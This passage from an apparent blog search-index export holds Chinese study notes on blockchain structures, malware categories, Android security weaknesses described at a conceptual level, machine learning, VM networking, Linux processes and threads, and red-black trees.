<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><blockquote>
<p>利用pwntool将asm转换成机器码</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *

# code to be emulated
context(log_level="info",arch="amd64",os="linux")
shellcode = asm("mov eax,0")
print(shellcode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
  </entry>
  <entry>
    <title>区块链</title>
    <url>/2021/06/28/qu-kuai-lian/</url>
    <content><![CDATA[<h1 id="BTC"><a href="#BTC" class="headerlink" title="BTC"></a>BTC</h1><blockquote>
<p>区块链1.0</p>
</blockquote>
<ul>
<li>去中心化有什么优势？<ul>
<li>流通性↑</li>
</ul>
</li>
</ul>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><blockquote>
<p>Hash指针，其实就是用Hash值表示key</p>
</blockquote>
<h3 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h3><h1 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h1><blockquote>
<p>工作量证明-&gt;权益证明<br>区块链2.0<br><strong>支持智能合约</strong>,以此实现一些金融衍生品<br>可以看成，交易驱动的状态机</p>
</blockquote>
<h2 id="ETH-账户"><a href="#ETH-账户" class="headerlink" title="ETH-账户"></a>ETH-账户</h2><blockquote>
<p>BTC的余额在UTXO中，交易时需要证明币的来源<br>BTC余额处理很反人类</p>
</blockquote>
<p>ETH基于账户</p>
<blockquote>
<p>交易时不需要证明的来源<br>余额直接放在账户上      </p>
</blockquote>
<ul>
<li>优势<ul>
<li>天然防御double spending attack(花两次，花钱的人不诚实)<br>余额保存在账户中，花两次也钱会少两次</li>
</ul>
</li>
<li>劣势</li>
<li>讨论<ul>
<li>篡改余额  余额由全节点维护，无法私自篡改</li>
<li>如何防御replay attack(收两次，收钱的人不诚实)<br>交易信息中加入nonce(交易的次数，nonce值是被签名的，无法被其他人篡改)</li>
</ul>
</li>
</ul>
<h3 id="外部账户"><a href="#外部账户" class="headerlink" title="外部账户"></a>外部账户</h3><blockquote>
<p>balance、nonce<br>可以主动发起交易</p>
</blockquote>
<h3 id="合约账户"><a href="#合约账户" class="headerlink" title="合约账户"></a>合约账户</h3><blockquote>
<p>balance、nonce、code、storage<br>不能主动发起交易</p>
</blockquote>
<h2 id="状态树"><a href="#状态树" class="headerlink" title="状态树"></a>状态树</h2><blockquote>
<p>地址→账户状态的映射<br>MPT(Merkle Paatricia Trie)</p>
</blockquote>
<h3 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h3><blockquote>
<p>字典树</p>
</blockquote>
<ul>
<li>优势<ul>
<li>ETH中的查找深度都是40</li>
<li>只要值不同，就不存在冲突</li>
<li>不同的结点无论按照何种顺序插入，最后的结构都是相同</li>
<li>更新操作具有良好的局部性</li>
</ul>
</li>
<li>劣势<ul>
<li>存储上存在浪费→压缩存储→Patricia trie<ul>
<li>为什么要使用Patricia trie？<br>  以太坊中的账户非常稀疏    </li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="/2021/06/28/qu-kuai-lian/patricia_trie.png" class="">

<h3 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h3><ul>
<li>Hash Table如何提供Merkle Proof？<ul>
<li>数量级太大，构建merkle tree的代价太大</li>
</ul>
</li>
<li>不排序的Merkle Tree是不行的</li>
<li>排序的Merkle Tree会遇到什么问题？   <ul>
<li>插入代价大</li>
</ul>
</li>
<li>以太坊中的账户为什么要设计得很长？<ul>
<li>避免碰撞</li>
</ul>
</li>
<li>为什么要保存历史状态？<ul>
<li>因为ETH是支持智能合约的，不像BTC可以按照交易内容很容易的推出之前的交易状态，所以，为了支持回滚，ETH需要保存历史状态。</li>
</ul>
</li>
</ul>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
<li>genesis block创世纪块</li>
</ul>
<h2 id="交易树与收据树"><a href="#交易树与收据树" class="headerlink" title="交易树与收据树"></a>交易树与收据树</h2><blockquote>
<p>MPT</p>
</blockquote>
<h3 id="bloom-filter"><a href="#bloom-filter" class="headerlink" title="bloom filter"></a>bloom filter</h3><blockquote>
<p>digest→vec<br>no false-nagative<br>false-positive→不支持删除操作</p>
</blockquote>
<h3 id="讨论-1"><a href="#讨论-1" class="headerlink" title="讨论"></a>讨论</h3><ul>
<li>为什么状态树要保存所有账户的状态？而不能只保存交易账户的状态？<ul>
<li>查找账户状态难，如果交易中的1个账户是新建立的账户，需要一直查找到创世纪块。</li>
</ul>
</li>
</ul>
<h2 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h2><blockquote>
<p>GHOST协议<br>Centralization bias<br>uncle block，包含叔父区块可以得到额外的出块奖励，叔父区块自身页可以拿到出块奖励</p>
</blockquote>
<h3 id="讨论-2"><a href="#讨论-2" class="headerlink" title="讨论"></a>讨论</h3><ul>
<li>叔父区块过多怎么办？</li>
<li>故意不包含某些叔父区块？<ul>
<li>损人不利己，但是自己损失较小</li>
<li>解决方法：叔父的辈分不仅仅只有一代</li>
</ul>
</li>
</ul>
<h2 id="挖矿算法"><a href="#挖矿算法" class="headerlink" title="挖矿算法"></a>挖矿算法</h2><h3 id="难度调整"><a href="#难度调整" class="headerlink" title="难度调整"></a>难度调整</h3><h4 id="难度炸弹"><a href="#难度炸弹" class="headerlink" title="难度炸弹"></a>难度炸弹</h4><h2 id="权益证明"><a href="#权益证明" class="headerlink" title="权益证明"></a>权益证明</h2><blockquote>
<p>工作量证明造成资源浪费？</p>
</blockquote>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><blockquote>
<p>去中心化的合同<br>solidity</p>
</blockquote>
<p>以太坊中只有外部账户能发起交易，合约交易不能主动发起交易</p>
<blockquote>
<p>合约的调用方法：</p>
<ol>
<li>间接调用：call和delegatecall(在当前合约环境下执行)</li>
<li>直接调用</li>
</ol>
</blockquote>
<h3 id="gas-fee"><a href="#gas-fee" class="headerlink" title="gas fee"></a>gas fee</h3><p>以太坊中的交易具有原子性，要么完全执行，要么完全不执行。<br>执行失败以后，状态回滚，但是gas fee不退。(防止DOS)</p>
<h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h3 id="TheDAO"><a href="#TheDAO" class="headerlink" title="TheDAO"></a>TheDAO</h3><p>重入攻击：同一部分代码被反复执行？</p>
<h3 id="Beauty-Chain"><a href="#Beauty-Chain" class="headerlink" title="Beauty Chain"></a>Beauty Chain</h3><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul>
<li>智能合约真的智能嘛？<ul>
<li>smart contract is anything but smart</li>
</ul>
</li>
<li>不可篡改性其实是1个双刃剑</li>
<li>Nothing is irrevocable.</li>
<li>solidity 这个语言是否有问题？ <ul>
<li>解决思路:模板</li>
</ul>
</li>
<li>去中心化意味着什么？<ul>
<li>分叉是民主的体现</li>
</ul>
</li>
<li>去中心化≠分布式<h3 id="讨论-3"><a href="#讨论-3" class="headerlink" title="讨论"></a>讨论</h3></li>
<li>全节点先挖矿还是先执行合约？<ul>
<li>执行过程中状态变化都在本地(本地维护了1个状态树)，执行完以后发布才达成共识</li>
<li>必须先执行，因为blocker header中包含三棵树的根hash值，而挖矿的nonce是要根据blocker header来计算的，所以要先执行合约再挖矿</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>常见二进制木马及病毒原理</title>
    <url>/2021/05/31/chang-jian-er-jin-zhi-mu-ma-ji-bing-du-yuan-li/</url>
    <content><![CDATA[<blockquote>
<p>草稿</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h2><ul>
<li>需要宿主-&gt;可执行文件</li>
<li>被感染文件运行-&gt;病毒传播</li>
<li>最常见类型：宏病毒？</li>
</ul>
<h2 id="木马-Trojan-Horse"><a href="#木马-Trojan-Horse" class="headerlink" title="木马(Trojan Horse)"></a>木马(Trojan Horse)</h2><ul>
<li>单个文件？</li>
<li>攻击者借助木马远程连接</li>
</ul>
<h2 id="蠕虫-worm"><a href="#蠕虫-worm" class="headerlink" title="蠕虫(worm)"></a>蠕虫(worm)</h2><ul>
<li>单个文件，没有主程序？指数定律增长？</li>
<li>分类<ul>
<li>带载荷：包含其它特定任务，例如在计算机上安装其它后门程序<ul>
<li> 逻辑炸弹(嵌入在正常软件中并在特定情况下执行的恶意程式码,通常是破坏计算机数据，造成主机宕机等)</li>
</ul>
</li>
<li>无载荷：除了消耗带宽，没有其他明显影响</li>
</ul>
</li>
<li>通常需要依靠操作系统的安全漏洞</li>
<li>攻击流程<ul>
<li>目标选择</li>
<li>扫描</li>
<li>入侵</li>
<li>传播</li>
<li>攻击载荷</li>
</ul>
</li>
<li>影响</li>
<li>案例分析<ul>
<li>冲击波蠕虫        <ul>
<li>是否可以通过伪造无害的变体来防御攻击？</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><ul>
<li>一组文件</li>
<li>完全管理员权限</li>
<li>感染后难以解决：比如说rootkit可能驻留在内核中，因为内核通常需要重装操作系统</li>
</ul>
<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ul>
<li>绕过安全防护机制</li>
<li>可以是软件、硬件甚至是算法(类似于密码算法中的陷门？)</li>
</ul>
<h1 id="病毒-1"><a href="#病毒-1" class="headerlink" title="病毒"></a>病毒</h1><h1 id="蠕虫"><a href="#蠕虫" class="headerlink" title="蠕虫"></a>蠕虫</h1><img src="/2021/05/31/chang-jian-er-jin-zhi-mu-ma-ji-bing-du-yuan-li/%E7%97%85%E6%AF%92%E4%B8%8E%E8%A0%95%E8%99%AB%E7%9A%84%E5%8C%BA%E5%88%AB.png" class="" title="蠕虫与病毒的区别">
<h2 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h2><ol>
<li>与病毒技术结合</li>
<li>多平台</li>
<li>物联网</li>
<li>隐身能力↑</li>
</ol>
]]></content>
      <categories>
        <category>网络安全基础知识</category>
      </categories>
      <tags>
        <tag>木马</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习</title>
    <url>/2021/08/13/ji-qi-xue-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>两类问题：分类、预测</p>
<h1 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h1><p><a href="https://zhuanlan.zhihu.com/p/60719445">https://zhuanlan.zhihu.com/p/60719445</a></p>
<h1 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h1><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>代价函数作文章，减少某些特征的影响   </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B01.jpg" class="">   


<p>正则化<br>缩小所有参数的值    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E4%BB%A3%E4%BB%B7%E5%87%BD%E6%95%B02.png" class="">   
<p>图中的λ称为正则化参数。<br>为什么能起到缩小所有参数的作用？<br>引入的式子是二次项。加入任意1个参数θ<sub>i</sub>变大为θ<sub>i</sub>'，都会有J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>,...) &lt;= J(θ<sub>1</sub>,θ<sub>2</sub>,...,θ<sub>i</sub>',...)<br>所谓调参，其实就是调整λ的值</p>
<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><p>神经元模型    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B.png" class="">
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B2.png" class="">

<p>例子    </p>
<img src="/2021/08/13/ji-qi-xue-xi/%E7%A5%9E%E7%BB%8F%E5%85%83%E6%A8%A1%E5%9E%8B-%E4%BE%8B%E5%AD%90.png" class="">]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
  </entry>
  <entry>
    <title>移动端安全概要</title>
    <url>/2021/07/19/yi-dong-duan-an-quan-gai-yao/</url>
    <content><![CDATA[<h1 id="发展态势"><a href="#发展态势" class="headerlink" title="发展态势"></a>发展态势</h1><ol>
<li>新发布App数量多，增幅大</li>
</ol>
<h2 id="安全挑战"><a href="#安全挑战" class="headerlink" title="安全挑战"></a>安全挑战</h2><ol>
<li>二维码藏毒：将病毒链接成二维码发布</li>
<li>APP二次打包被植入木马</li>
<li>APP盗版</li>
<li>通信劫持</li>
</ol>
<h1 id="Android安全"><a href="#Android安全" class="headerlink" title="Android安全"></a>Android安全</h1><h2 id="Android系统机制"><a href="#Android系统机制" class="headerlink" title="Android系统机制"></a>Android系统机制</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><ul>
<li>dex与odex<br>  odex其实就是编译后的dex</li>
</ul>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>权限级别：</p>
<ol>
<li>normal：应用申请这个级别的权限时，系统会比较大方的授予</li>
<li>dangerous：系统在授予该级别权限之前会询问用户</li>
<li>signature：如果A应用定义了1个权限P，当B应用申请权限P的时候，仅当A和B两个应用拥有相同的证书签名，系统才会授予B应用该权限。该情况下，通常A、B两个应用是由同一个开发者开发的或者是同一个公司的产品。</li>
<li>signatureOrSystem：只有APP存在于Android系统的镜像里或者使用相同证书签名的应用，才会被授予该级别权限。少见，通常用于Android系统内置应用。<h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3></li>
</ol>
<h3 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h3><p>WebView objects allow you to display web content as part of your activity layout, but lack some of the features of fully-developed browsers. </p>
<h4 id="Android与JS交互"><a href="#Android与JS交互" class="headerlink" title="Android与JS交互"></a>Android与JS交互</h4><p>我们可以在网页中随意调用本地的Java代码<br>步骤(资源中有对应的html文件)：</p>
<ol>
<li>注册html</li>
<li>调用对应接口</li>
</ol>
<h4 id="WebView远程代码执行漏洞"><a href="#WebView远程代码执行漏洞" class="headerlink" title="WebView远程代码执行漏洞"></a>WebView远程代码执行漏洞</h4><blockquote>
<p>触发条件： API &lt;= 16      </p>
</blockquote>
<blockquote>
<p>漏洞成因：没有正确限制WebView.addJavascriptInterface方法的使用，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法   </p>
</blockquote>
<blockquote>
<p>简要描述：通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。</p>
</blockquote>
<blockquote>
<p>参考文献：</p>
<ol>
<li>Attacks on WebView in the Android System    </li>
<li>POC:<a href="https://cloud.tencent.com/developer/article/1743487">https://cloud.tencent.com/developer/article/1743487</a></li>
</ol>
</blockquote>
<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ol>
<li>网络中间人攻击：通信过程中给出现非法第三方</li>
<li>组件劫持攻击：例如页面劫持，页面跳转至不可信第三方</li>
<li>组件能力滥用：android系统组件在指定Intent以后默认情况下是可以被外部程序访问的，可以被外部访问意味着可能被其它程序用来串谋攻击。<ol>
<li>Activity</li>
<li>BroadCast——发送安全与接收安全、有序广播与无序广播<br> 有序广播可被优先级高的应用篡改或终止</li>
<li>Service<br> 直接stopService影响程序正常使用</li>
<li>Content Provider<br>程序间数据共享，如无保护会导致无授权获取敏感信息</li>
</ol>
</li>
<li>调试敏感信息泄露<br> LogCat敏感信息泄露，不仅输出系统日志信息，也会输出应用日志信息</li>
<li>服务端注入攻击(对服务器中的数据库进行注入)</li>
<li>客户端注入攻击(对本地的数据库进行注入)<br> 成因：使用SQLite进行数据存储<br> 例子：<ol>
<li>WebView注入；</li>
<li>通过原始SQL语句对SQLite数据库进行传统的SQL注入；</li>
<li><a href="http://www.cxyzjd.com/article/u013107656/53337422">内容提供程序SQL注入</a>；</li>
<li>内容提供程序路径遍历。</li>
</ol>
</li>
<li>网络传输信息泄露</li>
<li>外部存储信息泄露   <ul>
<li>sdcard</li>
</ul>
</li>
<li>内部存储信息泄露<ul>
<li>app/</li>
<li>data/</li>
</ul>
</li>
</ol>
<h2 id="APP安全渗透测试"><a href="#APP安全渗透测试" class="headerlink" title="APP安全渗透测试"></a>APP安全渗透测试</h2><p>应用分类：</p>
<ol>
<li>web应用</li>
<li>原生应用——响应速度快、不支持跨平台</li>
<li>混合应用</li>
</ol>
<h2 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h2><h3 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a>防篡改</h3><ul>
<li>防二次打包</li>
</ul>
<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><ul>
<li>多进程保护</li>
<li>防内存dump<ol>
<li>inotify防内存dump——监控/proc/pid/mem</li>
</ol>
</li>
</ul>
<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><ul>
<li>每一代加固技术对应的对抗手段有哪些？</li>
<li>代码抽取保护</li>
</ul>
<h1 id="安全手机系统"><a href="#安全手机系统" class="headerlink" title="安全手机系统"></a>安全手机系统</h1><h2 id="加密电话"><a href="#加密电话" class="headerlink" title="加密电话"></a>加密电话</h2><ul>
<li>加密VoIP电话：将语音转化为IP数据包</li>
</ul>
]]></content>
      <categories>
        <category>移动端</category>
      </categories>
  </entry>
  <entry>
    <title>虚拟机环境配置</title>
    <url>/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/</url>
    <content><![CDATA[<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>配置网络的时候一定要把网卡对应上！</p>
<h2 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h2><p>桥接模式对应的网卡就是宿主机本身使用的网卡</p>
<h3 id="复制物理网络连接状态"><a href="#复制物理网络连接状态" class="headerlink" title="复制物理网络连接状态"></a>复制物理网络连接状态</h3><p>复制物理网卡连接状态，就是说把你指定的、本机的、真实网卡的状态信息复制给虚拟机的虚拟网卡，比如说你的本机真实网卡链接到了家用路由器的LAN口上，获得到了DHCP分配的地址，那么你的虚拟网卡就好像和真是网卡接入了同一台交换机中，也可以获得DHCP分配到的地址。</p>
<h2 id="Host-only"><a href="#Host-only" class="headerlink" title="Host-only"></a>Host-only</h2><p>一般对应VM1网卡,不与外网相连</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
<li><p>eth0网卡丢失.<br> ifconfig -a发现eth0网卡仍然存在.    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/ifconfig_a.png" class="">    
<p> ifconfig eth0 up以后没有ipv4地址！    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E7%BD%91%E5%8D%A1%E9%87%8D%E5%90%AF.png" class="">    
<p> 解决方案1：设置静态ip然后重启网络服务    </p>
 <img src="/2021/08/12/xu-ni-ji-huan-jing-pei-zhi/%E9%9D%99%E6%80%81ip.png" class="">      
<p> /etc/init.d/networking restart</p>
</li>
<li><p>Linux无法ping通windows虚拟机，但是windows可以ping通linux虚拟机<br> 原因：windows的防火墙没有关掉</p>
</li>
</ol>
<h1 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h1><ol>
<li>服务自启动 <pre class="line-numbers language-none"><code class="language-none">systemctl enable/disable [service]
chkconfig [service] on/off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><h2 id="硬盘扩容"><a href="#硬盘扩容" class="headerlink" title="硬盘扩容"></a>硬盘扩容</h2><p>ubuntu硬盘扩容：gparted一键扩容</p>
]]></content>
  </entry>
  <entry>
    <title>Process &amp; Thread</title>
    <url>/2021/08/24/process-thread/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>进程是正在运行的程序实体，是资源分配的基本单位。</p>
<p>线程是轻量级的进程，是独立调度的基本单位。设置线程，主要目的是提高程序的并行性。</p>
<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><ol>
<li><p>资源方面</p>
<ol>
<li><p>线程的共享资源</p>
<p> 线程之间资源共享，比如代码段、数据段、打开文件表等。</p>
</li>
<li><p>线程的独享资源<br> 但是线程也有独享资源，比如栈、寄存器等。</p>
<ul>
<li><p>寄存器：不同CPU各自拥有各自的寄存器</p>
</li>
<li><p>线程栈：线程栈均分配在共享的虚拟地址空间中，线程可以通过暴露栈地址的方式让它的Peer Thread访问其栈空间。</p>
<p>  为什么线程的栈是独享的？<br>  因为每个线程给自拥有自己的代码，在运行过程中会涉及到一些栈操作，所以要分开。</p>
<p>  关于线程栈的大小，linux在创建线程的时候默认线程栈的大小为8M，可以主动设置。  </p>
<p>  <strong>那么线程拥有各自的堆嘛？</strong></p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>Context Switch</p>
<p> 在上下文切换时，进程的消耗高于线程的消耗。其主要原因如下：</p>
<ol>
<li>进程需要保存的数据更多，例如PCB</li>
<li>进程的上下文切换涉及到虚拟地址空间上，诸如代码段、数据段的切换，而线程不需要</li>
<li>因为虚拟地址空间的切换，cache和TLB也会失效，需要更新(复习有关cache和tlb的知识)</li>
</ol>
</li>
<li><p>一个线程阻塞以后，它的Peer Thread都会阻塞，即整个进程阻塞。    </p>
<p> 从OS层面，OS只和进程打交道。当一个线程因为IO等原因阻塞以后，OS会将整个进程阻塞掉。    </p>
<p> 当然，对于多核处理器而言，一个线程的阻塞不会影响另一个处理器中它Peer Thread的运行。</p>
</li>
</ol>
<h1 id="Linux中的进程与线程"><a href="#Linux中的进程与线程" class="headerlink" title="Linux中的进程与线程"></a>Linux中的进程与线程</h1><h2 id="Linux中的进程"><a href="#Linux中的进程" class="headerlink" title="Linux中的进程"></a>Linux中的进程</h2><p>进程描述符task_struct</p>
<p>Linux中进程的创建过程：<br>创建进程描述符→申请内存空间→设置进程状态、将其加入调度序列</p>
<h3 id="COW-写时复制"><a href="#COW-写时复制" class="headerlink" title="COW(写时复制)"></a>COW(写时复制)</h3><p>Linux父进程在创建子进程的时候，子进程最初复用父进程的地址空间。只有当内存页发生变化的时候，才会重新申请一块内存页。fork()的子进程的堆栈指向父进程的堆栈。</p>
<h3 id="Linux进程树"><a href="#Linux进程树" class="headerlink" title="Linux进程树"></a>Linux进程树</h3><p>init进程：在内核启动的最后阶段，会创建init进程，它的进程id为1(Linux最大进程号为32767)</p>
<p>init进程有3个特点：</p>
<ol>
<li>无默认的信号处理程序</li>
<li>收养孤儿进程</li>
<li>init进程死亡，则所有进程被杀死</li>
</ol>
<h3 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h3><p>通信方式：</p>
<ol>
<li>OS：信号量、共享内存、pipe</li>
<li>文件：UNIX域套接字、文件</li>
<li>网络：socket套接字</li>
</ol>
<p>pipe：<br>一种基础的IPC(Inter-Process Communication)机制。</p>
<ol>
<li>在Linux中，其本质是内核的缓冲区，一种伪文件。</li>
<li>在管道创建的时候，会生成两个文件描述符，一为只读端，一为只写端。（不能同时读和同时写，也不能重复读；半双工通信？）</li>
</ol>
<p>管道的分类：无名管道和有名管道(存在于文件系统中，mkfifo)</p>
<p>管道的局限性：<br>只能在拥有公共祖先的进程之间使用管道？<br>因为管道只存在于内存中。</p>
<p>常见的通信方式有：单工通信(数据流向为单向)、半双工通信(数据流向为双向，但是双方不可同时)、全双工通信(双向，同时)</p>
<h3 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h3><p>信号处理一般发生在进程从内核态返回用户态的时候，此时内核会查看进程的信号队列，然后执行信号处理程序？</p>
<h3 id="后台进程与守护进程"><a href="#后台进程与守护进程" class="headerlink" title="后台进程与守护进程"></a>后台进程与守护进程</h3><p>后台进程与终端绑定，shell退出它也退出，<br>守护进程与终端脱离，shell推出它不退出。</p>
<p>进程→进程组→会话<br>一个进程组由多个进程构成，一个会话由多个进程组构成</p>
<p>如何实现一个守护进程？nohup</p>
<h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>进程状态：</p>
<ol>
<li>Running：就绪态和运行态</li>
<li>深度睡眠(<strong>忽略信号</strong>)和浅度睡眠：阻塞态</li>
<li>Zombie：僵死进程，内核中的垃圾进程，但是父进程未wait()，资源还没有回收</li>
<li>Dead：顾名思义</li>
<li>Stop：一般被调试的进程处于这个状态</li>
<li>Trace：被监视的进程处于这个状态</li>
</ol>
<p>首先，调度模式有两种分别为：preemptive(抢占式)和cooperative(非抢占式)</p>
<p>程序可以分为IO繁忙型和CPU繁忙型。<br>IO繁忙型比如：网络、键盘、GUI程序</p>
<p>Linux有很多调度算法，最新的是CFS。<br>其大致思想为以优先级为权重，为每个进程记录虚拟运行时间vruntime，优先级大的vruntime增长慢，CFS总是选择vruntime最小的进程优先调度。<br>它使用红黑树维护调度实体(sched_entity存放在task_struct中)</p>
<p>进程转入sleep状态会做的事情：</p>
<ol>
<li>将自身标记为sleep状态</li>
<li>移出就绪队列(runqueue)，加入waitqueue</li>
<li>触发schedule函数，调度其它进程</li>
</ol>
<h2 id="Linux中的线程"><a href="#Linux中的线程" class="headerlink" title="Linux中的线程"></a>Linux中的线程</h2><p>Linux没有单独的线程概念，实际上Linux中的线程就是一个普通的进程，只是它可能与其它进程共享某些资源，如地址空间。</p>
<h1 id="Windows中的进程与线程"><a href="#Windows中的进程与线程" class="headerlink" title="Windows中的进程与线程"></a>Windows中的进程与线程</h1><p>首先要明确的一点是，windows中的线程与线程是截然不同的，这一点与linux有本质区别。在windos中，进程只负责资源分配，而线程是调度的基本单位，二者都拥有自己独立的数据结构。</p>
<p>其它的以后再研究吧。。。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://blog.csdn.net/XD_hebuters/article/details/79623130">CFS调度算法</a></li>
<li><a href="https://notes.eddyerburgh.me/operating-systems/linux/process-scheduling">Linux进程调度算法</a></li>
</ol>
]]></content>
      <categories>
        <category>计算机基础知识</category>
      </categories>
      <tags>
        <tag>进程</tag>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title>红黑树</title>
    <url>/2021/08/30/hong-hei-shu/</url>
    <content><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>红黑树是一棵二叉查找树。</p>
<p>它有以下性质：</p>
<ol>
<li>只有红黑两个颜色的节点</li>
<li>根节点是黑色的</li>
<li>红色节点的两个子节点一定是黑色节点</li>
<li>任意一个节点到所有叶子节点的路径上的黑色节点数量一致</li>
<li>所有的叶子节点都是黑色的节点</li>
</ol>
<p>数据结构：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">struct t_red_black_node {
    enum { red, black } colour;
    void *item;
    struct t_red_black_node *left,
                     *right,
                     *parent;
    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="算法复杂度分析"><a href="#算法复杂度分析" class="headerlink" title="算法复杂度分析"></a>算法复杂度分析</h2><h3 id="红黑树的最大高度是2lg-n-1-其中n表示红黑树的内部节点数量。"><a href="#红黑树的最大高度是2lg-n-1-其中n表示红黑树的内部节点数量。" class="headerlink" title="红黑树的最大高度是2lg(n+1),其中n表示红黑树的内部节点数量。"></a>红黑树的最大高度是2lg(n+1),其中n表示红黑树的内部节点数量。</h3><p>概念介绍：black-height<br>对于任意节点x，它到叶子节点的路径上的黑色节点的数量称为它的black-height，bh(x)。</p>
<p>引理1：对于高度为h，根节点为t的红黑树，它的内部节点数量至少为2<sup>bh(t)</sup>-1个。</p>
<p>直观理解：在bh(t)已知的情况下，怎样让树中的节点最少？即树中没有红色的节点，那么该树是一棵只有黑色节点的满二叉树，它的节点数量为2<sup>bh(t)</sup>-1个。</p>
<p>数学归纳法证明：</p>
<ol>
<li>当节点x为叶子节点时，即h=0，bh(x)=0，其内部节点的数量为0&gt;=2<sup>bh(x)</sup>-1=0，原命题成立;</li>
<li>当节点x的高度为h-1的时候，假设该命题仍然成立;</li>
<li>当节点x的高度为h的时候，它的左右子树的black-height为bh(x)或bh(x)-1，所以它的左右子树的节点数量至少为2<sup>bh(x)-1</sup>-1，所以它的节点数量至少为(2<sup>bh(x)-1</sup>-1 + 2<sup>bh(x)-1</sup>-1)+1 = 2<sup>bh(x)</sup>-1，证毕。</li>
</ol>
<h2 id="红黑树的操作"><a href="#红黑树的操作" class="headerlink" title="红黑树的操作"></a>红黑树的操作</h2><p>略，太复杂了，以后有时间再说。。。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.cs.auckland.ac.nz/software/AlgAnim/red_black.html">https://www.cs.auckland.ac.nz/software/AlgAnim/red_black.html</a></li>
</ol>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
  </entry>
  <entry>
